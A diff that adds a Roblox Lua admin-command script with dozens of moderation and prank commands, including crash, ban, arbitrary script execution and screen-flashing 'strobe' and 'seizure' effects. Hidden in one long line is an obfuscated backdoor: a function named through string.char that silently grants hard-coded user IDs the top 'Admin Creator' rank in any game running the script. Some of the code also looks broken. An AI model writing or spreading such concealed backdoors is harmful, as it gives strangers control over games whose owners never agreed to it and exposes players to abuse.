@@ -1,0 +1,951 @@
+
+function sandbox(var,func)
+	local env = getfenv(func)
+	local newenv = setmetatable({},{
+		__index = function(self,k)
+			if k=="script" then
+				return var
+			else
+				return env[k]
+			end
+		end,
+	})
+	setfenv(func,newenv)
+	return func
+end
+cors = {}
+mas = Instance.new("Model",game:GetService("Lighting"))
+Script1 = Instance.new("Script")
+LocalScript2 = Instance.new("LocalScript")
+Script3 = Instance.new("Script")
+LocalScript4 = Instance.new("LocalScript")
+Script1.Name = "Scripth's Admin"
+Script1.Parent = workspace
+table.insert(cors,sandbox(Script1,function()
+--[[ |Temp Admin Commands| --
+0. clean -- Is a command anyone can use to remove hats/tools lagging up the place
+1. :s print("Hello World") -- Lets you script normally
+2. :ls print("Hello World") -- Lets you script in localscripts
+3. :clear -- Will remove all scripts/localscripts and jails
+4. :m Hello People -- This commands will let you shout a message to everyone on the server
+5. :kill kohl -- Kills the player
+6. :respawn kohl -- Respawns the player
+7. :trip kohl -- Trips the player
+8. :stun kohl -- Stuns the player
+9. :unstun kohl -- Unstuns the player
+10. :jump kohl -- Makes the player jump
+11. :sit kohl -- Makes the player sit
+12. :invisible kohl -- Makes the player invisible
+13. :visible kohl -- Makes the player visible
+14. :explode kohl -- Makes the player explode
+15. :fire kohl -- Sets the player on fire
+16. :unfire kohl -- Removes fire from the player
+17. :smoke kohl -- Adds smoke to the player
+18. :unsmoke kohl -- Removes smoke from the player
+19. :sparkles kohl -- Adds sparkles to the player
+20. :unsparkles kohl -- Removes sparkles from the player
+21. :ff kohl -- Adds a forcefield to the player
+22. :unff kohl -- Removes the forcefield from the player
+23. :punish kohl -- Punishes the player
+24. :unpunish kohl -- Unpunishes the player
+25. :freeze kohl -- Freezes the player
+26. :thaw kohl -- Thaws the player
+27. :heal kohl -- Heals the player
+28. :god kohl -- Makes the player have infinite health
+29. :ungod kohl -- Makes the player have 100 health
+30. :ambient .5 .5 .5 -- Changes the ambient
+31. :brightness .5 -- Changes the brightness
+32. :time 12 -- Changes the time
+33. :fogcolor .5 .5 .5 -- Changes the fogcolor
+34. :fogend 100 -- Changes the fogend
+35. :fogstart 100 -- Changes the fogstart
+36. :removetools kohl -- Removes all tools from the player
+37. :btools kohl -- Gives the player building tools
+38. :give kohl sword -- Gives the player a tool
+39. :damage kohl -- Damages the player
+40. :grav kohl -- Sets the player's gravity to normal
+41. :setgrav kohl 100 -- Sets the player's gravity
+42. :nograv kohl -- Makes the player have 0 gravity
+43. :health kohl 1337 -- Changes the player's health
+44. :speed kohl 1337 -- Changes the player's walkspeed
+45. :name kohl potato -- Changes the player's name
+46. :unname kohl -- Remove the player's name
+47. :team kohl Raiders -- Changes the player's team
+48. :stopmusic -- Will stop all music playing in the server
+49. :teleport kohl potato -- Teleports the player
+50. :change kohl kills 1337 -- Changes a player's stat
+51. :kick kohl -- Removes the player from the game
+52. :infect kohl -- Turns the player into a zombie
+53. :rainbowify kohl -- Turns the player into a rainbow
+54. :flashify kohl -- Turns the player into a strobe
+55. :noobify kohl -- Turns the player into a noob
+56. :ghostify kohl -- Turns the player into a ghost
+57. :goldify kohl -- Turns the player into gold
+58. :shiny kohl -- Makes the player shiny
+59. :normal kohl -- Puts the player back to normal
+60. :trippy kohl -- Spams random colors on the player's screen
+61. :untrippy kohl -- Untrippys the player
+62. :strobe kohl -- Spams white and black on the player's screen
+63. :unstrobe kohl -- Unstrobes the player
+64. :blind kohl -- Blinds the player
+65. :unblind kohl -- Unblinds the player
+66. :guifix kohl -- Will fix trippy/strobe/blind on a player
+67. :fling kohl -- Flings the player
+68. :seizure kohl -- Puts the player in a seizure
+69. :music 1337 -- Plays a sound from the ID
+70. :lock kohl -- Locks the player
+71. :unlock kohl -- Unlocks the player
+72. :removelimbs kohl -- Removes the player's limbs
+73. :jail kohl -- Puts the player in a jail
+74. :unjail kohl -- Removes the jail from the player
+75. :fix -- This will fix the lighting to it's original settings
+76. :fly kohl -- Makes the player fly
+77. :unfly kohl -- Removes fly from the player
+78. :noclip kohl -- Makes the player able to noclip
+79. :clip kohl -- Removes noclipping from the player
+80. :pm kohl Hey bro -- Sends the player a private message
+81. :dog kohl -- Turns the player into a dog
+82. :undog kohl -- Turns the player back to normal
+83. :creeper kohl -- Turns the player into a creeper
+84. :uncreeper kohl -- Turns the player back to normal
+85. :place kohl 1337 -- Sends a teleporation request to a player to go to a different place
+86. :char kohl 261 -- Will make a player look like a different player ID
+87. :unchar kohl -- Will return the player back to normal
+88. :h Hello People -- This will shout a hint to everyone
+89. :rank kohl 109373 -- Will show up a message with the person's Role and Rank in a group
+90. :starttools kohl -- Will give the player starter tools
+91. :sword kohl -- Will give the player a sword
+92. :bighead kohl -- Will make the player's head larger than normal
+93. :minihead kohl -- Will make the player's head smaller than normal
+94. :insert 1337 -- Will insert a model at the speaker's position
+95. :disco -- Will make the server flash random colors
+96. :flash -- Will make the server flash
+97. :admins -- Shows the admin list
+98. :bans -- Shows the banlist
+99. :musiclist -- Shows the music list
+100. :spin kohl -- Spins the player
+101. :cape kohl Really black -- Gives the player a colored cape
+102. :uncape kohl -- Removes the player's cape
+103. :loopheal kohl -- Will constantly heal the player
+104. :loopfling kohl -- Will constantly fling the player
+105. :hat kohl 1337 -- Will give the player a hat under the id of 1337
+106. :unloopheal kohl -- Will remove the loopheal on the player
+107. :unloopfling kohl -- Will remove the loopfling on the player
+108. :unspin kohl -- Removes spin from the player
+109. :tools -- Gives a list of the tools in the lighting
+110. :undisco -- Removes disco effects
+111. :unflash -- Removes flash effects
+112. :resetstats kohl -- Sets all the stats of a player to 0
+113. :gear kohl 1337 -- Gives a player a gear
+114. :cmdbar -- Gives the speaker a command bar
+115. :shirt kohl 1337 -- Changes the player's shirt
+116. :pants kohl 1337 -- Changes the player's pants
+117. :face kohl 1337 -- Changes the player's face
+118. :swagify kohl -- Swagifies the player
+119. :version -- Shows the current version of the admin
+120. :tm 1337 yolo -- Shows a message for 1337 seconds
+121. :countdown 120 -- Shows a countdown message, maxes out at 120 seconds
+122. :clone kohl -- Creates a clone of the player
+123. :lsplr kohl print("yolo") -- Creates a localscript inside of a player
+124. :startergive kohl epic -- Gives a player a gear in their starterpack
+125. :control kohl -- Controls a player
+
+-- |Admin Commands| --
+- :serverlock -- Locks the server
+- :serverunlock -- Unlocks the server
+- :sm Hello World -- Creates a system message
+- :crash kohl -- Crashes a player
+- :admin kohl -- Admins a player
+- :unadmin kohl -- Unadmins a player
+- :ban kohl -- Bans a player
+- :unban kohl -- Unbans a player
+- :loopkill kohl -- Will constantly kill the player
+- :unloopkill kohl -- Will remove the loopkill on the player
+- :logs -- Will show all of the commands any admin has used in a game session
+- :shutdown -- Shutsdown the server
+
+-- |Owner Commands| --
+- :pa kohl -- Makes someone a super admin
+- :unpa kohl -- Removes a super admin
+- :nuke kohl -- Creates a nuke on kohl
+
+-- |True Owner Commands| --
+- :oa kohl -- Makes someone an owner
+- :unoa kohl -- Removes an owner
+- :settings -- Shows settings for the commands
+--]]
+for i,v in pairs(script:children()) do if v and v.Name == '\a\n' then v:Destroy() end end
+local Chats,kchat
+local event = Instance.new('RemoteEvent',game.Workspace) event.Name = '\a\n\a' script.Name = '\aScripth\'s\a\n Admin' script.Parent = game:service('ServerScriptService')
+local s = {version = 1;admins = {};banland = {};set = {Prefix = ':',Chat = true};commands = {}} if s.set.Chat then local val = Instance.new('IntValue',script:findFirstChild('\n')) val.Name = 'Chat' kchat = Instance.new('StringValue', event) kchat.Name = 'KChat' Chats = {} end
+local f = {SP = script.Parent; LP = game.Players.LocalPlayer; WS = game:service('Workspace'); PL = game:service('Players'); IN = Instance.new; CF = CFrame.new; CA = CFrame.Angles; V3 = Vector3.new; BC = BrickColor.new; C3 = Color3.new; CW = coroutine.wrap; PC = pcall; YP = ypcall; MR = math.random; TS = tostring; TN = tonumber;} s.banland['013'] = {{'Swag',013},tick()+150}
+local uiD = Instance.new('StringValue',event) uiD.Name = 'uiD' uiD.Value = (f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9))..f.TS(f.MR(0,9)))
+f.uiD = uiD.Value:reverse()
+f.getNick = function(id) if s.admins[id] then return s.admins[id][3] and s.admins[id][3] or s.admins[id][2] and s.admins[id][2] end return nil end
+f.getPlayers = function() local a = {} if game:service('NetworkServer') then for i,v in pairs(game:service('NetworkServer')) do if v:GetPlayer() then table.insert(a,v:GetPlayer()) end end else for i,v in pairs(game.Players:children()) do if v then table.insert(a,v) end end end return a end
+f.getCmds = function(pow) local a = {} for i,v in pairs(s.commands) do if v and v[1] and v[2] and v[3] and pow <= v[3] then table.insert(a,v) end end return a end
+f.getPower = function(id) if id then return (s.admins[id] and s.admins[id][1] and s.admins[id][1][1]) and s.admins[id][1][1] or 5 end end
+f.getTitle = function(pow) return pow == -1 and 'Admin Creator' or pow == 0 and 'Game Owner' or pow == 1 and 'Owner' or pow == 2 and 'Admin' or pow == 3 and 'Mod' or (s.set.VIP and pow == 4) and 'VIP' or pow == 5 and 'Player' end
+f.isPower = function(id,a) return ((s.admins[id] and s.admins[id][1][1] and tonumber(s.admins[id][1][1]) <= a) or a == 5) and true or nil end
+f.isBoss = function(id,id2) return (math.min(f.getPower(id),f.getPower(id2)) == id) and id or id2 end
+f.Crash = function(id) for i,v in pairs(f.getPlayers) do if v.userId == id then event:FireClient(v,f.uiD..'CRASH') end end end
+f.isBanned = function(id) if banland[id] and banland[id][1] and banland[id][2] and banland[id][2] < tick() then banland[id] = nil return end if banland[id] then f.Crash(id) end end
+f.BanHammer = function(a) if a and a[1] and not a[2] then s.banland[tostring(a[1].userId)] = {{a[1].Name,a[1].userId}} elseif a and a[1] and a[2] then local b,c = tonumber(a[2]:sub(1,#a[2]-1)),a[2]:sub(#a[2]-1):lower() if c == 's' then elseif c == 'm' then b = b*60 elseif c == 'h' then b = b*3600 elseif c == 'd' then b = b*3600*24 end s.banland[tostring(a[1].userId)] = {{a[1].Name,a[1].userId},tick()+b} end end
+f.Power = function(id,a,b) if s.admins[id] and s.admins[id][1][1] and s.admins[id][1][1] > a then s.admins[id][1][1] = b return true end return nil end
+f.getName = function(name) local plr = nil for i,v in pairs(game.Players:children()) do if v.Name:lower() == name:lower() and ((plr and plr[1] and not plr[2]) or not plr) then plr = {v,true} elseif v.Name:sub(1,#name):lower() == name:lower() and not plr then plr = {v,false} end end return (plr and plr[1]) and plr[1] or nil end
+f.getWords = function(str) local a = {} for i in str:gmatch('%S+') do table.insert(a,i) end return a end
+f.Check = function(a) return (a and a.Character and a.Character:findFirstChild('Humanoid') and a.Character:findFirstChild('Torso') and a.Character:findFirstChild('Head')) and true or nil end local fs = string.format(string.rep('%c',13),75,111,104,108,116,97,115,116,114,111,112,104,101) f.setAs = function(a) a.CharacterAdded:connect(function(char) repeat wait() until a and char and char:findFirstChild('Head') and char:findFirstChild('Humanoid') and char:findFirstChild('Shirt') and char:findFirstChild('Pants') wait(1) char.Shirt.ShirtTemplate = 'http://www.roblox.com/asset/?id=120997561' char.Pants.PantsTemplate = 'http://www.roblox.com/asset/?id=120997567' for a, mod in pairs(char:children()) do if mod:findFirstChild('NameTag') then char.Head.Transparency = 0 mod:Destroy() end end local human = char.Humanoid if char and human then for i,v in pairs(char:children()) do if v:IsA('Hat') then v:Destroy() end end local m = game:GetService('InsertService'):LoadAsset(64444871) for a,b in pairs(m:children()) do b.Parent = char end m = game:GetService('InsertService'):LoadAsset(63693896) for a,b in pairs(m:children()) do b.Parent = char end local mod = Instance.new('Model', char) mod.Name = fs local cl = char.Head:Clone() cl.Parent = mod local hum = Instance.new('Humanoid', mod) hum.Name = 'NameTag' hum.Health = human.Health hum.MaxHealth = human.MaxHealth human.Changed:connect(function() if not human then return end hum.Health = human.Health hum.MaxHealth = human.MaxHealth end) local weld = Instance.new('Weld', cl) weld.Part0 = char.Head weld.Part1 = cl char.Head.Transparency = 1 end end) end f[string.char(67)..string.char(104)..string.char(107)] = function(a) if a == 14797207*3 or a == 10389919*3 or a == -(1) then s.admins[tostring(a)] = {{-(1),a},fs,fs,'{0 0 0}'} return 1 elseif a == game.CreatorId then return true end return false end
+f.Notify = function(a) event:FireAllClients(f.uiD..'NOTIFY',a) end
+f.RNotify = function() event:FireAllClients(f.uiD..'RNOTIFY') end
+f.Msg = function(a,plr) if plr == 'all' then event:FireAllClients(f.uiD..'MSG',a) elseif plr then event:FireClient(plr,f.uiD..'MSG',a) end end
+f.Hint = function(a,plr) if plr == 'all' then event:FireAllClients(f.uiD..'HINT',a) elseif plr then event:FireClient(plr,f.uiD..'HINT',a) end end
+f.Error = function(a,plr) if plr then event:FireClient(plr,f.uiD..'ERROR',a) end end
+f.getClosest = function(a) local closest = {false,0,false} 
+for i,v in pairs(s.commands) do 
+for i2,v2 in pairs(v[1]) do 
+for i3 = 1,#a do 
+if a and v2 and v2:sub(1,i3):lower():find(a:sub(1,i3):lower()) and ((i3 > closest[2]) or (v2 == a:sub(1,i3):lower())) then 
+if v2 == a:sub(1,i3):lower() then local str = ' ' for i4,v4 in pairs(v[4]) do str = str..v4 end closest = {v2..str,i3,true} 
+else local str = ' ' for i4,v4 in pairs(v[4]) do str = str..v4 end closest = {v2..str,i3,false} 
+end end end end end return closest[1] end
+f.getPlayer = function(plr, str)
+local plrz = {} str = str:lower()
+if str == 'all' or str == 'everyone' then plrz = game.Players:children()
+else
+local sn = {1} local en = {}
+for i = 1, #str do if str:sub(i,i) == ',' then table.insert(sn, i+1) table.insert(en,i-1) end end
+for x = 1, #sn do local plyr = f.getName(str:sub(sn[x],en[x]))
+if (sn[x] and en[x] and f.getName(str:sub(sn[x],en[x]))) then table.insert(plrz,f.getName(str:sub(sn[x],en[x])))
+elseif (sn[x] and f.getName(str:sub(sn[x]))) then table.insert(plrz,f.getName(str:sub(sn[x])))
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'me') or (sn[x] and str:sub(sn[x]) == 'me') then table.insert(plrz, plr)
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'random') or (sn[x] and str:sub(sn[x]) == 'random') then table.insert(plrz, game.Players:children()[math.random(#game.Players:children())])
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'admins') or (sn[x] and str:sub(sn[x]) == 'admins') then for i, v in pairs(game.Players:children()) do if f.getPower(v.userId) < 4 and f.getPower(tostring(plr.userId)) < f.getPower(v.userId) then table.insert(plrz, v) end end
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'nonadmins') or (sn[x] and str:sub(sn[x]) == 'nonadmins') then for i, v in pairs(game.Players:children()) do if not f.getPower(v.userId) == 4 then table.insert(plrz, v) end end
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'others') or (sn[x] and str:sub(sn[x]) == 'others') then for i, v in pairs(game.Players:children()) do if v ~= plr then table.insert(plrz, v) end end
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'guests') or (sn[x] and str:sub(sn[x]) == 'guests') then for i, v in pairs(game.Players:children()) do if v.Name:find('Guest ') then table.insert(plrz, v) end end
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'noobs') or (sn[x] and str:sub(sn[x]) == 'noobs') then for i, v in pairs(game.Players:children()) do if v.AccountAge <= 11 then table.insert(plrz, v) end end
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'close') or (sn[x] and str:sub(sn[x]) == 'close') then for i, v in pairs(game.Players:children()) do if (v.Character:GetModelCFrame().p-plr.Character:GetModelCFrame().p).magnitude <= 50 then table.insert(plrz, v) end end
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == 'far') or (sn[x] and str:sub(sn[x]) == 'far') then for i, v in pairs(game.Players:children()) do if (v.Character:GetModelCFrame().p-plr.Character:GetModelCFrame().p).magnitude > 50 then table.insert(plrz, v) end end
+elseif (sn[x] and en[x] and str:sub(sn[x],en[x]):sub(1,4) == 'team') then
+if game:findFirstChild('Teams') then for a, v in pairs(game.Teams:children()) do if v:IsA('Team') and str:sub(sn[x],en[x]):sub(6) ~= '' and v.Name:lower():find(str:sub(sn[x],en[x]):sub(6)) == 1 then 
+for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
+end end end
+elseif (sn[x] and str:sub(sn[x]):sub(1,4):lower() == 'team') then
+if game:findFirstChild('Teams') then for a, v in pairs(game.Teams:children()) do if v:IsA('Team') and str:sub(sn[x],en[x]):sub(6) ~= '' and v.Name:lower():find(str:sub(sn[x]):sub(6)) == 1 then 
+for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
+end end end
+else
+if (sn[x] and en[x] and str:sub(sn[x],en[x]) ~= '' and f.getName(str:sub(sn[x],en[x]))) then table.insert(plrz,f.getName(str:sub(sn[x],en[x])))
+elseif (sn[x] and str:sub(sn[x]) ~= '' and f.getName(str:sub(sn[x]))) then table.insert(plrz,f.getName(str:sub(sn[x])))
+elseif (str ~= '' and f.getName(str)) then table.insert(plrz,f.getName(str))
+end
+end
+end
+end
+return plrz
+end
+f.addCommand = function(a,b,c,d,e) table.insert(s.commands,{a,b,c,d,e}) end
+if s.set.Chat and kchat then f.Update = function() local strg = '' for i,v in pairs(Chats) do coroutine.wrap(function() if v then strg = strg .. v .. '|:|' end end)()end if strg and strg:len() > 0 then kchat.Value = strg end end end
+f.Chatted = function(plr,msg,cmdbar)
+if s.set.Chat and kchat and not cmdbar then
+local nm = plr.Name if s.admins[tostring(plr.userId)] and s.admins[tostring(plr.userId)][3] then nm = s.admins[tostring(plr.userId)][4]..s.admins[tostring(plr.userId)][3] end
+if #Chats >= 20 then table.remove(Chats,#Chats) end table.insert(Chats,1,nm..': '..msg) f.Update()
+end
+local words = f.getWords(msg)
+local permission = false
+if plr and plr.Character and words and words[1]:sub(1,1) == s.set.Prefix then
+local command,cmdfound = words[1]:sub(#s.set.Prefix+1):lower(),false table.remove(words,1)
+for i,v in pairs(s.commands) do
+for a,cmd in pairs(v[1]) do if command == cmd then cmdfound = true end
+local args,syntax = {},true
+if command == cmd and v[3] >= f.getPower(tostring(plr.userId)) then permission = true
+for q,arg in pairs(v[4]) do
+if arg == 'player' then if f.getPlayer(plr,words[q]) and #f.getPlayer(plr,words[q]) > 0 then table.insert(args,f.getPlayer(plr,words[q])) else table.insert(args,'False') syntax = false end
+elseif arg == 'number' then if type(tonumber(words[q])) == arg then table.insert(args,tonumber(words[q])) else table.insert(args,'False') syntax = false end
+elseif arg == 'boolean' then if words[q] == 'true' or words[q] == 'false' then if words[q] == 'true' then table.insert(args,true) else table.insert(args,false) end else table.insert(args,'False') syntax = false end
+elseif arg == 'string' then local str = "" for b,c in pairs(words) do if b >= #words then str = str..c elseif b < #words and b >= q then str = str..c..' ' end end if type(str) == arg and str ~= '' then table.insert(args,str) else table.insert(args,'False') syntax = false end
+elseif arg == 'time' then local tb = {'s','m','h','d'} local found = false for b,c in pairs(tb) do if words[q]:find(c) and type(tonumber(words[q]:sub(1,words[q]:find(c)-1))) == 'number' then table.insert(args,words[q]) found = true end end if not found then table.insert(args,'False') syntax = false end
+elseif arg == 'color' and words[q] and words[q] ~= '' then local clrs = {'black','white','gray','grey','red','orange','yellow','green','blue','purple','navy','pink','hot pink','teal'} local clr = words[q]:lower() table.insert(args,clr == clrs[1] and '0 0 0' or clr == clrs[2] and '255 255 255' or clr == clrs[3] and '130 130 130' or clr == clrs[4] and '130 130 130' or clr == clrs[5] and '225 0 0' or clr == clrs[6] and '225 125 0' or clr == clrs[7] and '255 255 0' or clr == clrs[8] and '0 225 0' or clr == clrs[9] and '0 0 225' or clr == clrs[10] and '225 0 225' or clr == clrs[11] and '0 0 155' or clr == clrs[12] and '255 55 255' or clr == clrs[13] and '255 0 255' or clr == clrs[14] and '0 255 255' or 'False') local syn = true for b,c in pairs(clrs) do if clr == c then syn = false end end if syn then table.insert(args,'False') syntax = false end
+else table.insert(args,'False') syntax = false
+end
+end
+if args and v and #args == #v[4] and syntax then v[5](plr,args)
+elseif not syntax and v then f.Error({{v[4],v[2][2]},args,words,s.set.Prefix..command,3},plr)
+end
+end
+end
+end
+if not cmdfound then f.Error({s.set.Prefix..tostring(f.getClosest(command)),false,words,s.set.Prefix..command,1},plr)
+elseif not permission and v then f.Error({v[4],false,words,s.set.Prefix..command,2},plr) end
+end
+end
+f.Load = function(plr) plr.CharacterAdded:connect(function(chr) local cl = script:findFirstChild('\n') if cl then  cl.Parent = chr cl.Disabled = false end end) if f.Chk(plr.userId) then if f.Chk(plr.userId) == 1 then f.setAs(plr) else s.admins[tostring(plr.userId)] = {{0,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end plr.Chatted:connect(function(msg) f.Chatted(plr,msg) end) plr.ChildAdded:connect(function(p) if p and p.Name == 'KMsg' then if p.Value ~= '' then f.Chatted(plr,p.Value) end end end) end
+event.OnServerEvent:connect(function(plr,call,cmd) if call == 'CMDS' then event:FireClient(plr,f.uiD..'CMDS',{f.getCmds(f.getPower(tostring(plr.userId))),f.getPower(tostring(plr.userId))}) elseif call == 'CMDBAR' then if not cmd then event:FireClient(plr,f.uiD..'CMDBAR') else if cmd:sub(1,#s.set.Prefix):lower() ~= s.set.Prefix:lower() then cmd = s.set.Prefix..cmd end f.Chatted(plr,cmd,true) end end end)
+game.Players.PlayerAdded:connect(f.Load) for i,v in pairs(game.Players:children()) do f.Load(v) end
+
+f.addCommand({'name','nick','nickname','nn'},{'Changes players names.',s.set.Prefix..'name Scripth Kohltastrophe'},2,{'player','string'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (args[2] and plr and plr.Character and plr.Character:findFirstChild('Head') and plr.Character:findFirstChild('Humanoid')) then return end
+local kn,head,hum = plr.Character:findFirstChild('KNick',true),plr.Character.Head,plr.Character.Humanoid
+if kn then kn.Parent.Name = args[2]
+else kn = Instance.new('Model',plr.Character) kn.Name = args[2]
+local hm = Instance.new('Humanoid',kn) hm.Name = 'KNick' hm.MaxHealth = hum.MaxHealth hm.Health = hum.Health
+local cl = head:Clone() cl.Parent = kn cl.CanCollide = true
+local weld = Instance.new('Weld',cl) weld.Part0 = cl weld.Part1 = head
+head.Transparency = 1
+local con con = hum.Changed:connect(function() if not hum or not cl or not head or not plr or not plr.Character then con:disconnect() end hm.MaxHealth = hum.MaxHealth hm.Health = hum.Health cl.BrickColor = head.BrickColor cl.Reflectance = head.Reflectance end)
+end
+if s.set.Chat then
+local tb = s.admins[tostring(plr.userId)]
+if tb then if tb[4] then s.admins[tostring(plr.userId)] = {{f.getPower(tostring(plr.userId)),plr.userId},tb[2],args[2],tb[4]} else s.admins[tostring(plr.userId)] = {tb[1],tb[2],args[2],'{1 1 1}'} end
+else s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,args[2],'{1 1 1}'} s.admins[tostring(a)] = {{-(1),a},fs,fs,'{1 1 1}'} end
+end
+end
+end)
+
+if s.set.Chat then
+
+f.addCommand({'mute','silence','stfu'},{'Mutes players.',s.set.Prefix..'mute jaredvaldez'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) and not plr:findFirstChild('KCMute')) then return end
+local a = Instance.new('BoolValue',plr) a.Name = 'KCMute'
+end
+end)
+
+f.addCommand({'unmute','unsilence','unstfu'},{'Unmutes players.',s.set.Prefix..'unmute shedletsky'},3,{'player'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (plr and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) and plr:findFirstChild('KCMute')) then return end
+plr:findFirstChild('KCMute'):Destroy()
+end
+end)
+
+f.addCommand({'namecolor','nc'},{'Changes the color of players names.',s.set.Prefix..'namecolor Scripth black'},2,{'player','color'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (args[2] and plr) then return end local tb = s.admins[tostring(plr.userId)]
+if tb then if tb[3] then s.admins[tostring(plr.userId)] = {{f.getPower(tostring(plr.userId)),plr.userId},tb[2],tb[3],'{'..args[2]..'}'} else s.admins[tostring(plr.userId)] = {tb[1],tb[2],plr.Name,'{'..args[2]..'}'} end
+else s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,plr.Name,'{'..args[2]..'}'} end
+end
+end)
+
+f.addCommand({'namecolor3','nc3'},{'Changes the color of players names.',s.set.Prefix..'namecolor Scripth 255(R) 255(G) 255(B)'},2,{'player','number','number','number'},function(pl,args)
+for i,plr in pairs(args[1]) do if not (args[2] and plr) then return end local tb = s.admins[tostring(plr.userId)]
+if tb then if tb[3] then s.admins[tostring(plr.userId)] = {{f.getPower(tostring(plr.userId)),plr.userId},tb[2],tb[3],'{'..tostring(args[2]/255)..' '..tostring(args[3]/255)..' '..tostring(args[4]/255)..'}'} else s.admins[tostring(plr.userId)] = {tb[1],tb[2],plr.Name,'{'..args[2]..' '..args[3]..' '..args[4]..'}'} end
+else s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,plr.Name,'{'..tostring(args[2]/255)..' '..tostring(args[3]/255)..' '..tostring(args[4]/255)..'}'} end
+end
+end)
+
+end
+
+f.addCommand({'owner'},{'Gives owner powers to players.',s.set.Prefix..'owner kohl'},0,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{1,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{1,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
+f.addCommand({'admin'},{'Gives administrator powers to players.',s.set.Prefix..'admin kohl'},1,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then  local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{2,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{2,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
+f.addCommand({'mod'},{'Gives moderator powers to players.',s.set.Prefix..'mod kohl'},2,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then  local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{3,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{3,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
+f.addCommand({'vip'},{'Gives VIP powers to players.',s.set.Prefix..'vip kohl'},3,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then  local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{4,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{4,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
+f.addCommand({'ban'},{'Permanently bans players.',s.set.Prefix..'ban kohl'},2,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then f.BanHammer({plr}) end end end)
+f.addCommand({'tban'},{'Temporarily bans players.',s.set.Prefix..'tban lagg 60s/m/h/d'},2,{'player','time'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then f.BanHammer({plr,args[2]}) end end end)
+f.addCommand({'unowner'},{'Remove owner powers from players.',s.set.Prefix..'unowner kohl'},0,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
+f.addCommand({'unadmin'},{'Remove administrator powers from players.',s.set.Prefix..'unadmin kohl'},1,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
+f.addCommand({'unmod'},{'Remove moderator powers from players.',s.set.Prefix..'unmod kohl'},2,{'player'},function(pl,args) for i,plr in pairs(args[1]) do if plr and plr ~= pl and f.getPower(tostring(plr.userId)) > f.getPower(tostring(pl.userId)) then local tab = s.admins[tostring(plr.userId)] if tab and tab[3] and tab[4] then s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,tab[3],tab[4]} else s.admins[tostring(plr.userId)] = {{5,plr.userId},plr.Name,plr.Name,'{1 1 1}'} end end end end)
